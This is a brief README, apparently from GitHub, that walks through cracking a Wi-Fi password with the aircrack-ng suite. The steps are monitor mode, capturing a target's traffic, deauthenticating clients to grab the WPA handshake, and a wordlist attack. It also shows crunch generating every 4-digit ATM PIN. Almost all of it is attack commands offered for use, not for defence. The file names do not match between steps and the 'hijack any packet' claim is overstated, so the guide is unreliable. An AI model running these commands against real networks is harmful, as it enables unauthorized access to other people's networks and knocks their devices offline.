# Wifi-Hacking
This method allows hackers to hijack any packet of data that is being transmitted between a device and a router

![logo-wifi-some-countries-banning-wifi-schools-should-south-13 (2)](https://github.com/HackWithSumit/Wifi-Hacking/assets/120317751/6bc41f4b-7fc4-4c28-82a3-e6123102cc08)


Wifi Hacking

Divided into 5 steps:

1. Starting the Monitoring mode on the adapter. -> 
     
         airmon-ng start wlan0


4. Discovering the available networks: 
    
       airodump-ng wlan0
6. Performing authentication (Capturing the packets) -> 

       airodump-ng -c 6 -w oneplus --bssid A2:B0:A6:79:E4:8B wlan0
8. Performing De-authentication (Once this is successful we will be able to able to see "WPA Handshake" in above step) -> 
  
        aireplay-ng -0 0 -a A2:B0:A6:79:E4:8B wlan0 
10. Cracking the password. 

        aircrack-ng -w wordlist.txt kali.cap

         
        Once the password matches we will get the correct password.


        Crunch tool comes pre-installed in Kali. 

Command: 

     crunch <min> <max> [options]

  
Example: Creating atm pins, so we know that atm pin is of 4 digits to max and min will be of 4 digits and could be anywhere between 0-9. 
  
So the command will be 
  
     "crunch 4 4 0123456789 -o<output file path>"


